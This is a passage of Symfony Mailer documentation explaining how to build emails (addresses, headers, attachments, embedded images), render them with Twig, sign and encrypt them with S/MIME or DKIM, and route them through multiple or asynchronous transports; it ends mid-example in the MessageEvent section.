That's it! The message will be sent immediately via the transport you configured.
If you prefer to send emails asynchronously to improve performance, read the
:ref:`Sending Messages Async <mailer-sending-messages-async>` section. Also, if
your application has the :doc:`Messenger component </messenger>` installed, all
emails will be sent asynchronously by default
(but :ref:`you can change that <messenger-handling-messages-synchronously>`).

Email Addresses
~~~~~~~~~~~~~~~

All the methods that require email addresses (``from()``, ``to()``, etc.) accept
both strings or address objects::

    // ...
    use Symfony\Component\Mime\Address;

    $email = (new Email())
        // email address as a simple string
        ->from('fabien@example.com')

        // email address as an object
        ->from(new Address('fabien@example.com'))

        // defining the email address and name as an object
        // (email clients will display the name)
        ->from(new Address('fabien@example.com', 'Fabien'))

        // defining the email address and name as a string
        // (the format must match: 'Name <email@example.com>')
        ->from(Address::create('Fabien Potencier <fabien@example.com>'))

        // ...
    ;

.. tip::

    Instead of calling ``->from()`` *every* time you create a new email, you can
    :ref:`configure emails globally <mailer-configure-email-globally>` to set the
    same ``From`` email to all messages.

.. note::

    The local part of the address (what goes before the ``@``) can include UTF-8
    characters, except for the sender address (to avoid issues with bounced emails).
    For example: ``föóbàr@example.com``, ``用户@example.com``, ``θσερ@example.com``, etc.

Use ``addTo()``, ``addCc()``, or ``addBcc()`` methods to add more addresses::

    $email = (new Email())
        ->to('foo@example.com')
        ->addTo('bar@example.com')
        ->cc('cc@example.com')
        ->addCc('cc2@example.com')

        // ...
    ;

Alternatively, you can pass multiple addresses to each method::

    $toAddresses = ['foo@example.com', new Address('bar@example.com')];

    $email = (new Email())
        ->to(...$toAddresses)
        ->cc('cc1@example.com', 'cc2@example.com')

        // ...
    ;

Message Headers
~~~~~~~~~~~~~~~

Messages include a number of header fields to describe their contents. Symfony
sets all the required headers automatically, but you can set your own headers
too. There are different types of headers (Id header, Mailbox header, Date
header, etc.) but most of the times you'll set text headers::

    $email = (new Email())
        ->getHeaders()
            // this non-standard header tells compliant autoresponders ("email holiday mode") to not
            // reply to this message because it's an automated email
            ->addTextHeader('X-Auto-Response-Suppress', 'OOF, DR, RN, NRN, AutoReply')

            // use an array if you want to add a header with multiple values
            // (for example in the "References" or "In-Reply-To" header)
            ->addIdHeader('References', ['123@example.com', '456@example.com'])

            // ...
    ;

.. tip::

    Instead of calling ``->addTextHeader()`` *every* time you create a new email, you can
    :ref:`configure emails globally <mailer-configure-email-globally>` to set the same
    headers to all sent emails.

Message Contents
~~~~~~~~~~~~~~~~

The text and HTML contents of the email messages can be strings (usually the
result of rendering some template) or PHP resources::

    $email = (new Email())
        // ...
        // simple contents defined as a string
        ->text('Lorem ipsum...')
        ->html('<p>Lorem ipsum...</p>')

        // attach a file stream
        ->text(fopen('/path/to/emails/user_signup.txt', 'r'))
        ->html(fopen('/path/to/emails/user_signup.html', 'r'))
    ;

.. tip::

    You can also use Twig templates to render the HTML and text contents. Read
    the `Twig: HTML & CSS`_ section later in this article to
    learn more.

File Attachments
~~~~~~~~~~~~~~~~

Use the ``addPart()`` method with a ``File`` to add files that exist on your
file system::

    use Symfony\Component\Mime\Part\DataPart;
    use Symfony\Component\Mime\Part\File;
    // ...

    $email = (new Email())
        // ...
        ->addPart(new DataPart(new File('/path/to/documents/terms-of-use.pdf')))
        // optionally you can tell email clients to display a custom name for the file
        ->addPart(new DataPart(new File('/path/to/documents/privacy.pdf'), 'Privacy Policy'))
        // optionally you can provide an explicit MIME type (otherwise it's guessed)
        ->addPart(new DataPart(new File('/path/to/documents/contract.doc'), 'Contract', 'application/msword'))
    ;

Alternatively you can attach contents from a stream by passing it directly to
the ``DataPart``::

    $email = (new Email())
        // ...
        ->addPart(new DataPart(fopen('/path/to/documents/contract.doc', 'r')))
    ;

Embedding Images
~~~~~~~~~~~~~~~~

If you want to display images inside your email, you must embed them
instead of adding them as attachments. When using Twig to render the email
contents, as explained :ref:`later in this article <mailer-twig-embedding-images>`,
the images are embedded automatically. Otherwise, you need to embed them manually.

First, use the ``addPart()`` method to add an image from a
file or stream::

    $email = (new Email())
        // ...
        // get the image contents from a PHP resource
        ->addPart((new DataPart(fopen('/path/to/images/logo.png', 'r'), 'logo', 'image/png'))->asInline())
        // get the image contents from an existing file
        ->addPart((new DataPart(new File('/path/to/images/signature.gif'), 'footer-signature', 'image/gif'))->asInline())
    ;

Use the ``asInline()`` method to embed the content instead of attaching it.

The second optional argument of both methods is the image name ("Content-ID" in
the MIME standard). Its value is an arbitrary string used later to reference the
images inside the HTML contents::

    $email = (new Email())
        // ...
        ->addPart((new DataPart(fopen('/path/to/images/logo.png', 'r'), 'logo', 'image/png'))->asInline())
        ->addPart((new DataPart(new File('/path/to/images/signature.gif'), 'footer-signature', 'image/gif'))->asInline())

        // reference images using the syntax 'cid:' + "image embed name"
        ->html('<img src="cid:logo"> ... <img src="cid:footer-signature"> ...')

        // use the same syntax for images included as HTML background images
        ->html('... <div background="cid:footer-signature"> ... </div> ...')
    ;

You can also use the :method:`DataPart::setContentId() <Symfony\\Component\\Mime\\Part\\DataPart::setContentId>`
method to define a custom Content-ID for the image and use it as its ``cid`` reference::

    $part = new DataPart(new File('/path/to/images/signature.gif'));
    $part->setContentId('footer-signature');

    $email = (new Email())
        // ...
        ->addPart($part->asInline())
        ->html('... <img src="cid:footer-signature"> ...')
    ;

.. _mailer-configure-email-globally:

Configuring Emails Globally
---------------------------

Instead of calling ``->from()`` on each Email you create, you can configure this
value globally so that it is set on all sent emails. The same is true with ``->to()``
and headers.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        framework:
            mailer:
                envelope:
                    sender: 'fabien@example.com'
                    recipients: ['foo@example.com', 'bar@example.com']
                headers:
                    From: 'Fabien <fabien@example.com>'
                    Bcc: 'baz@example.com'
                    X-Custom-Header: 'foobar'

    .. code-block:: xml

        <!-- config/packages/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:mailer>
                    <framework:envelope>
                        <framework:sender>fabien@example.com</framework:sender>
                        <framework:recipients>foo@example.com</framework:recipients>
                        <framework:recipients>bar@example.com</framework:recipients>
                    </framework:envelope>
                    <framework:header name="From">Fabien &lt;fabien@example.com&gt;</framework:header>
                    <framework:header name="Bcc">baz@example.com</framework:header>
                    <framework:header name="X-Custom-Header">foobar</framework:header>
                </framework:mailer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $mailer = $framework->mailer();
            $mailer
                ->envelope()
                    ->sender('fabien@example.com')
                    ->recipients(['foo@example.com', 'bar@example.com'])
            ;

            $mailer->header('From')->value('Fabien <fabien@example.com>');
            $mailer->header('Bcc')->value('baz@example.com');
            $mailer->header('X-Custom-Header')->value('foobar');
        };

.. caution::

    Some third-party providers don't support the usage of keywords like ``from``
    in the ``headers``. Check out your provider's documentation before setting
    any global header.

Handling Sending Failures
-------------------------

Symfony Mailer considers that sending was successful when your transport (SMTP
server or third-party provider) accepts the mail for further delivery. The message
can later be lost or not delivered because of some problem in your provider, but
that's out of reach for your Symfony application.

If there's an error when handing over the email to your transport, Symfony throws
a :class:`Symfony\\Component\\Mailer\\Exception\\TransportExceptionInterface`.
Catch that exception to recover from the error or to display some message::

    use Symfony\Component\Mailer\Exception\TransportExceptionInterface;

    $email = new Email();
    // ...
    try {
        $mailer->send($email);
    } catch (TransportExceptionInterface $e) {
        // some error prevented the email sending; display an
        // error message or try to resend the message
    }

Debugging Emails
----------------

The :class:`Symfony\\Component\\Mailer\\SentMessage` object returned by the
``send()`` method of the :class:`Symfony\\Component\\Mailer\\Transport\\TransportInterface`
provides access to the original message (``getOriginalMessage()``) and to some
debug information (``getDebug()``) such as the HTTP calls done by the HTTP
transports, which is useful to debug errors.

.. note::

    If your code used :class:`Symfony\\Component\\Mailer\\MailerInterface`, you
    need to replace it by :class:`Symfony\\Component\\Mailer\\Transport\\TransportInterface`
    to have the ``SentMessage`` object returned.

.. note::

    Some mailer providers change the ``Message-Id`` when sending the email. The
    ``getMessageId()`` method from ``SentMessage`` always returns the definitive
    ID of the message (being the original random ID generated by Symfony or the
    new ID generated by the mailer provider).

The exceptions related to mailer transports (those which implement
:class:`Symfony\\Component\\Mailer\\Exception\\TransportException`) also provide
this debug information via the ``getDebug()`` method.

.. _mailer-twig:

Twig: HTML & CSS
----------------

The Mime component integrates with the :ref:`Twig template engine <twig-language>`
to provide advanced features such as CSS style inlining and support for HTML/CSS
frameworks to create complex HTML email messages. First, make sure Twig is installed:

.. code-block:: terminal

    $ composer require symfony/twig-bundle

    # or if you're using the component in a non-Symfony app:
    # composer require symfony/twig-bridge

HTML Content
~~~~~~~~~~~~

To define the contents of your email with Twig, use the
:class:`Symfony\\Bridge\\Twig\\Mime\\TemplatedEmail` class. This class extends
the normal :class:`Symfony\\Component\\Mime\\Email` class but adds some new methods
for Twig templates::

    use Symfony\Bridge\Twig\Mime\TemplatedEmail;

    $email = (new TemplatedEmail())
        ->from('fabien@example.com')
        ->to(new Address('ryan@example.com'))
        ->subject('Thanks for signing up!')

        // path of the Twig template to render
        ->htmlTemplate('emails/signup.html.twig')

        // change locale used in the template, e.g. to match user's locale
        ->locale('de')

        // pass variables (name => value) to the template
        ->context([
            'expiration_date' => new \DateTime('+7 days'),
            'username' => 'foo',
        ])
    ;

Then, create the template:

.. code-block:: html+twig

    {# templates/emails/signup.html.twig #}
    <h1>Welcome {{ email.toName }}!</h1>

    <p>
        You signed up as {{ username }} the following email:
    </p>
    <p><code>{{ email.to[0].address }}</code></p>

    <p>
        <a href="#">Activate your account</a>
        (this link is valid until {{ expiration_date|date('F jS') }})
    </p>

The Twig template has access to any of the parameters passed in the ``context()``
method of the ``TemplatedEmail`` class and also to a special variable called
``email``, which is an instance of
:class:`Symfony\\Bridge\\Twig\\Mime\\WrappedTemplatedEmail`.

Text Content
~~~~~~~~~~~~

When the text content of a ``TemplatedEmail`` is not explicitly defined, it is
automatically generated from the HTML contents.

Symfony uses the following strategy when generating the text version of an
email:

* If an explicit HTML to text converter has been configured (see
  :ref:`twig.mailer.html_to_text_converter
  <config-twig-html-to-text-converter>`), it calls it;

* If not, and if you have `league/html-to-markdown`_ installed in your
  application, it uses it to turn HTML into Markdown (so the text email has
  some visual appeal);

* Otherwise, it applies the :phpfunction:`strip_tags` PHP function to the
  original HTML contents.

If you want to define the text content yourself, use the ``text()`` method
explained in the previous sections or the ``textTemplate()`` method provided by
the ``TemplatedEmail`` class:

.. code-block:: diff

    +use Symfony\Bridge\Twig\Mime\TemplatedEmail;

     $email = (new TemplatedEmail())
         // ...

         ->htmlTemplate('emails/signup.html.twig')
    +     ->textTemplate('emails/signup.txt.twig')
         // ...
     ;

.. _mailer-twig-embedding-images:

Embedding Images
~~~~~~~~~~~~~~~~

Instead of dealing with the ``<img src="cid: ...">`` syntax explained in the
previous sections, when using Twig to render email contents you can refer to
image files as usual. First, to simplify things, define a Twig namespace called
``images`` that points to whatever directory your images are stored in:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            # ...

            paths:
                # point this wherever your images live
                '%kernel.project_dir%/assets/images': images

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <!-- ... -->

                <!-- point this wherever your images live -->
                <twig:path namespace="images">%kernel.project_dir%/assets/images</twig:path>
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            // ...

            // point this wherever your images live
            $twig->path('%kernel.project_dir%/assets/images', 'images');
        };

Now, use the special ``email.image()`` Twig helper to embed the images inside
the email contents:

.. code-block:: html+twig

    {# '@images/' refers to the Twig namespace defined earlier #}
    <img src="{{ email.image('@images/logo.png') }}" alt="Logo">

    <h1>Welcome {{ email.toName }}!</h1>
    {# ... #}

.. _mailer-inline-css:

Inlining CSS Styles
~~~~~~~~~~~~~~~~~~~

Designing the HTML contents of an email is very different from designing a
normal HTML page. For starters, most email clients only support a subset of all
CSS features. In addition, popular email clients like Gmail don't support
defining styles inside ``<style> ... </style>`` sections and you must **inline
all the CSS styles**.

CSS inlining means that every HTML tag must define a ``style`` attribute with
all its CSS styles. This can make organizing your CSS a mess. That's why Twig
provides a ``CssInlinerExtension`` that automates everything for you. Install
it with:

.. code-block:: terminal

    $ composer require twig/extra-bundle twig/cssinliner-extra

The extension is enabled automatically. To use it, wrap the entire template
with the ``inline_css`` filter:

.. code-block:: html+twig

    {% apply inline_css %}
        <style>
            {# here, define your CSS styles as usual #}
            h1 {
                color: #333;
            }
        </style>

        <h1>Welcome {{ email.toName }}!</h1>
        {# ... #}
    {% endapply %}

Using External CSS Files
........................

You can also define CSS styles in external files and pass them as
arguments to the filter:

.. code-block:: html+twig

    {% apply inline_css(source('@styles/email.css')) %}
        <h1>Welcome {{ username }}!</h1>
        {# ... #}
    {% endapply %}

You can pass unlimited number of arguments to ``inline_css()`` to load multiple
CSS files. For this example to work, you also need to define a new Twig namespace
called ``styles`` that points to the directory where ``email.css`` lives:

.. _mailer-css-namespace:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            # ...

            paths:
                # point this wherever your css files live
                '%kernel.project_dir%/assets/styles': styles

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <!-- ... -->

                <!-- point this wherever your css files live -->
                <twig:path namespace="styles">%kernel.project_dir%/assets/styles</twig:path>
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            // ...

            // point this wherever your css files live
            $twig->path('%kernel.project_dir%/assets/styles', 'styles');
        };

.. _mailer-markdown:

Rendering Markdown Content
~~~~~~~~~~~~~~~~~~~~~~~~~~

Twig provides another extension called ``MarkdownExtension`` that lets you
define the email contents using `Markdown syntax`_. To use this, install the
extension and a Markdown conversion library (the extension is compatible with
several popular libraries):

.. code-block:: terminal

    # instead of league/commonmark, you can also use erusev/parsedown or michelf/php-markdown
    $ composer require twig/extra-bundle twig/markdown-extra league/commonmark

The extension adds a ``markdown_to_html`` filter, which you can use to convert parts or
the entire email contents from Markdown to HTML:

.. code-block:: twig

    {% apply markdown_to_html %}
        Welcome {{ email.toName }}!
        ===========================

        You signed up to our site using the following email:
        `{{ email.to[0].address }}`

        [Activate your account]({{ url('...') }})
    {% endapply %}

.. _mailer-inky:

Inky Email Templating Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Creating beautifully designed emails that work on every email client is so
complex that there are HTML/CSS frameworks dedicated to that. One of the most
popular frameworks is called `Inky`_. It defines a syntax based on some HTML-like
tags which are later transformed into the real HTML code sent to users:

.. code-block:: html

    <!-- a simplified example of the Inky syntax -->
    <container>
        <row>
            <columns>This is a column.</columns>
        </row>
    </container>

Twig provides integration with Inky via the ``InkyExtension``. First, install
the extension in your application:

.. code-block:: terminal

    $ composer require twig/extra-bundle twig/inky-extra

The extension adds an ``inky_to_html`` filter, which can be used to convert
parts or the entire email contents from Inky to HTML:

.. code-block:: html+twig

    {% apply inky_to_html %}
        <container>
            <row class="header">
                <columns>
                    <spacer size="16"></spacer>
                    <h1 class="text-center">Welcome {{ email.toName }}!</h1>
                </columns>

                {# ... #}
            </row>
        </container>
    {% endapply %}

You can combine all filters to create complex email messages:

.. code-block:: twig

    {% apply inky_to_html|inline_css(source('@styles/foundation-emails.css')) %}
        {# ... #}
    {% endapply %}

This makes use of the :ref:`styles Twig namespace <mailer-css-namespace>` we created
earlier. You could, for example, `download the foundation-emails.css file`_
directly from GitHub and save it in ``assets/styles``.

.. _signing-and-encrypting-messages:

Signing and Encrypting Messages
-------------------------------

It's possible to sign and/or encrypt email messages to increase their
integrity/security. Both options can be combined to encrypt a signed message
and/or to sign an encrypted message.

Before signing/encrypting messages, make sure to have:

* The `OpenSSL PHP extension`_ properly installed and configured;
* A valid `S/MIME`_ security certificate.

.. tip::

    When using OpenSSL to generate certificates, make sure to add the
    ``-addtrust emailProtection`` command option.

.. caution::

    Signing and encrypting messages require their contents to be fully rendered.
    For example, the content of :ref:`templated emails <mailer-twig>` is rendered
    by a :class:`Symfony\\Component\\Mailer\\EventListener\\MessageListener`.
    So, if you want to sign and/or encrypt such a message, you need to do it in
    a :ref:`MessageEvent <messageevent>` listener run after it (you need to set
    a negative priority to your listener).

Signing Messages
~~~~~~~~~~~~~~~~

When signing a message, a cryptographic hash is generated for the entire content
of the message (including attachments). This hash is added as an attachment so
the recipient can validate the integrity of the received message. However, the
contents of the original message are still readable for mailing agents not
supporting signed messages, so you must also encrypt the message if you want to
hide its contents.

You can sign messages using either ``S/MIME`` or ``DKIM``. In both cases, the
certificate and private key must be `PEM encoded`_, and can be either created
using for example OpenSSL or obtained at an official Certificate Authority (CA).
The email recipient must have the CA certificate in the list of trusted issuers
in order to verify the signature.

.. caution::

    If you use message signature, sending to ``Bcc`` will be removed from the
    message. If you need to send a message to multiple recipients, you need
    to compute a new signature for each recipient.

S/MIME Signer
.............

`S/MIME`_ is a standard for public key encryption and signing of MIME data. It
requires using both a certificate and a private key::

    use Symfony\Component\Mime\Crypto\SMimeSigner;
    use Symfony\Component\Mime\Email;

    $email = (new Email())
        ->from('hello@example.com')
        // ...
        ->html('...');

    $signer = new SMimeSigner('/path/to/certificate.crt', '/path/to/certificate-private-key.key');
    // if the private key has a passphrase, pass it as the third argument
    // new SMimeSigner('/path/to/certificate.crt', '/path/to/certificate-private-key.key', 'the-passphrase');

    $signedEmail = $signer->sign($email);
    // now use the Mailer component to send this $signedEmail instead of the original email

.. tip::

    The ``SMimeSigner`` class defines other optional arguments to pass
    intermediate certificates and to configure the signing process using a
    bitwise operator options for :phpfunction:`openssl_pkcs7_sign` PHP function.

DKIM Signer
...........

`DKIM`_ is an email authentication method that affixes a digital signature,
linked to a domain name, to each outgoing email messages. It requires a private
key but not a certificate::

    use Symfony\Component\Mime\Crypto\DkimSigner;
    use Symfony\Component\Mime\Email;

    $email = (new Email())
        ->from('hello@example.com')
        // ...
        ->html('...');

    // first argument: same as openssl_pkey_get_private(), either a string with the
    // contents of the private key or the absolute path to it (prefixed with 'file://')
    // second and third arguments: the domain name and "selector" used to perform a DNS lookup
    // (the selector is a string used to point to a specific DKIM public key record in your DNS)
    $signer = new DkimSigner('file:///path/to/private-key.key', 'example.com', 'sf');
    // if the private key has a passphrase, pass it as the fifth argument
    // new DkimSigner('file:///path/to/private-key.key', 'example.com', 'sf', [], 'the-passphrase');

    $signedEmail = $signer->sign($email);
    // now use the Mailer component to send this $signedEmail instead of the original email

    // DKIM signer provides many config options and a helper object to configure them
    use Symfony\Component\Mime\Crypto\DkimOptions;

    $signedEmail = $signer->sign($email, (new DkimOptions())
        ->bodyCanon('relaxed')
        ->headerCanon('relaxed')
        ->headersToIgnore(['Message-ID'])
        ->toArray()
    );

Encrypting Messages
~~~~~~~~~~~~~~~~~~~

When encrypting a message, the entire message (including attachments) is
encrypted using a certificate. Therefore, only the recipients that have the
corresponding private key can read the original message contents::

    use Symfony\Component\Mime\Crypto\SMimeEncrypter;
    use Symfony\Component\Mime\Email;

    $email = (new Email())
        ->from('hello@example.com')
        // ...
        ->html('...');

    $encrypter = new SMimeEncrypter('/path/to/certificate.crt');
    $encryptedEmail = $encrypter->encrypt($email);
    // now use the Mailer component to send this $encryptedEmail instead of the original email

You can pass more than one certificate to the ``SMimeEncrypter`` constructor
and it will select the appropriate certificate depending on the ``To`` option::

    $firstEmail = (new Email())
        // ...
        ->to('jane@example.com');

    $secondEmail = (new Email())
        // ...
        ->to('john@example.com');

    // the second optional argument of SMimeEncrypter defines which encryption algorithm is used
    // (it must be one of these constants: https://www.php.net/manual/en/openssl.ciphers.php)
    $encrypter = new SMimeEncrypter([
        // key = email recipient; value = path to the certificate file
        'jane@example.com' => '/path/to/first-certificate.crt',
        'john@example.com' => '/path/to/second-certificate.crt',
    ]);

    $firstEncryptedEmail = $encrypter->encrypt($firstEmail);
    $secondEncryptedEmail = $encrypter->encrypt($secondEmail);

.. _multiple-email-transports:

Multiple Email Transports
-------------------------

You may want to use more than one mailer transport for delivery of your messages.
This can be configured by replacing the ``dsn`` configuration entry with a
``transports`` entry, like:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        framework:
            mailer:
                transports:
                    main: '%env(MAILER_DSN)%'
                    alternative: '%env(MAILER_DSN_IMPORTANT)%'

    .. code-block:: xml

        <!-- config/packages/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:mailer>
                    <framework:transport name="main">%env(MAILER_DSN)%</framework:transport>
                    <framework:transport name="alternative">%env(MAILER_DSN_IMPORTANT)%</framework:transport>
                </framework:mailer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use function Symfony\Component\DependencyInjection\Loader\Configurator\env;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->mailer()
                ->transport('main', env('MAILER_DSN'))
                ->transport('alternative', env('MAILER_DSN_IMPORTANT'))
            ;
        };

By default the first transport is used. The other transports can be selected by
adding an ``X-Transport`` header (which Mailer will remove automatically from
the final email)::

    // Send using first transport ("main"):
    $mailer->send($email);

    // ... or use the transport "alternative":
    $email->getHeaders()->addTextHeader('X-Transport', 'alternative');
    $mailer->send($email);

.. _mailer-sending-messages-async:

Sending Messages Async
----------------------

When you call ``$mailer->send($email)``, the email is sent to the transport immediately.
To improve performance, you can leverage :doc:`Messenger </messenger>` to send
the messages later via a Messenger transport.

Start by following the :doc:`Messenger </messenger>` documentation and configuring
a transport. Once everything is set up, when you call ``$mailer->send()``, a
:class:`Symfony\\Component\\Mailer\\Messenger\\SendEmailMessage` message will
be dispatched through the default message bus (``messenger.default_bus``). Assuming
you have a transport called ``async``, you can route the message there:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    async: "%env(MESSENGER_TRANSPORT_DSN)%"

                routing:
                    'Symfony\Component\Mailer\Messenger\SendEmailMessage': async

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="async">%env(MESSENGER_TRANSPORT_DSN)%</framework:transport>
                    <framework:routing message-class="Symfony\Component\Mailer\Messenger\SendEmailMessage">
                        <framework:sender service="async"/>
                    </framework:routing>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->messenger()
                ->transport('async')->dsn(env('MESSENGER_TRANSPORT_DSN'));

            $framework->messenger()
                ->routing('Symfony\Component\Mailer\Messenger\SendEmailMessage')
                ->senders(['async']);
        };

Thanks to this, instead of being delivered immediately, messages will be sent
to the transport to be handled later (see :ref:`messenger-worker`). Note that
the "rendering" of the email (computed headers, body rendering, ...) is also
deferred and will only happen just before the email is sent by the Messenger
handler.

When sending an email asynchronously, its instance must be serializable.
This is always the case for :class:`Symfony\\Component\\Mailer\\Mailer`
instances, but when sending a
:class:`Symfony\\Bridge\\Twig\\Mime\\TemplatedEmail`, you must ensure that
the ``context`` is serializable. If you have non-serializable variables,
like Doctrine entities, either replace them with more specific variables or
render the email before calling ``$mailer->send($email)``::

    use Symfony\Component\Mailer\MailerInterface;
    use Symfony\Component\Mime\BodyRendererInterface;

    public function action(MailerInterface $mailer, BodyRendererInterface $bodyRenderer): void
    {
        $email = (new TemplatedEmail())
            ->htmlTemplate($template)
            ->context($context)
        ;
        $bodyRenderer->render($email);

        $mailer->send($email);
    }

You can configure which bus is used to dispatch the message using the ``message_bus`` option.
You can also set this to ``false`` to call the Mailer transport directly and
disable asynchronous delivery.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        framework:
            mailer:
                message_bus: app.another_bus

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:mailer
                    message_bus="app.another_bus"
                >
                </framework:mailer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->mailer()
                ->messageBus('app.another_bus');
        };

.. note::

    In cases of long-running scripts, and when Mailer uses the
    :class:`Symfony\\Component\\Mailer\\Transport\\Smtp\\SmtpTransport`
    you may manually disconnect from the SMTP server to avoid keeping
    an open connection to the SMTP server in between sending emails.
    You can do so by using the ``stop()`` method.

You can also select the transport by adding an ``X-Bus-Transport`` header (which
will be removed automatically from the final message)::

    // Use the bus transport "app.another_bus":
    $email->getHeaders()->addTextHeader('X-Bus-Transport', 'app.another_bus');
    $mailer->send($email);

Adding Tags and Metadata to Emails
----------------------------------

Certain 3rd party transports support email *tags* and *metadata*, which can be used
for grouping, tracking and workflows. You can add those by using the
:class:`Symfony\\Component\\Mailer\\Header\\TagHeader` and
:class:`Symfony\\Component\\Mailer\\Header\\MetadataHeader` classes. If your transport
supports headers, it will convert them to their appropriate format::

    use Symfony\Component\Mailer\Header\MetadataHeader;
    use Symfony\Component\Mailer\Header\TagHeader;

    $email->getHeaders()->add(new TagHeader('password-reset'));
    $email->getHeaders()->add(new MetadataHeader('Color', 'blue'));
    $email->getHeaders()->add(new MetadataHeader('Client-ID', '12345'));

If your transport does not support tags and metadata, they will be added as custom headers:

.. code-block:: text

    X-Tag: password-reset
    X-Metadata-Color: blue
    X-Metadata-Client-ID: 12345

The following transports currently support tags and metadata:

* Brevo
* Mailgun
* Mandrill
* Postmark
* Sendgrid

The following transports only support tags:

* MailPace
* Resend

The following transports only support metadata:

* Amazon SES (note that Amazon refers to this feature as "tags", but Symfony
  calls it "metadata" because it contains a key and a value)

Draft Emails
------------

:class:`Symfony\\Component\\Mime\\DraftEmail` is a special instance of
:class:`Symfony\\Component\\Mime\\Email`. Its purpose is to build up an email
(with body, attachments, etc) and make available to download as an ``.eml`` with
the ``X-Unsent`` header. Many email clients can open these files and interpret
them as *draft emails*. You can use these to create advanced ``mailto:`` links.

Here's an example of making one available to download::

    // src/Controller/DownloadEmailController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpFoundation\ResponseHeaderBag;
    use Symfony\Component\Mime\DraftEmail;
    use Symfony\Component\Routing\Attribute\Route;

    class DownloadEmailController extends AbstractController
    {
        #[Route('/download-email')]
        public function __invoke(): Response
        {
            $message = (new DraftEmail())
                ->html($this->renderView(/* ... */))
                ->addPart(/* ... */)
            ;

            $response = new Response($message->toString());
            $contentDisposition = $response->headers->makeDisposition(
                ResponseHeaderBag::DISPOSITION_ATTACHMENT,
                'download.eml'
            );
            $response->headers->set('Content-Type', 'message/rfc822');
            $response->headers->set('Content-Disposition', $contentDisposition);

            return $response;
        }
    }

.. note::

    As it's possible for :class:`Symfony\\Component\\Mime\\DraftEmail`'s to be created
    without a To/From they cannot be sent with the mailer.

Mailer Events
-------------

MessageEvent
~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\Mailer\\Event\\MessageEvent`

``MessageEvent`` allows to change the Mailer message and the envelope before
the email is sent::

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Mailer\Event\MessageEvent;
    use Symfony\Component\Mime\Email;

    public function onMessage(MessageEvent $event): void
    {
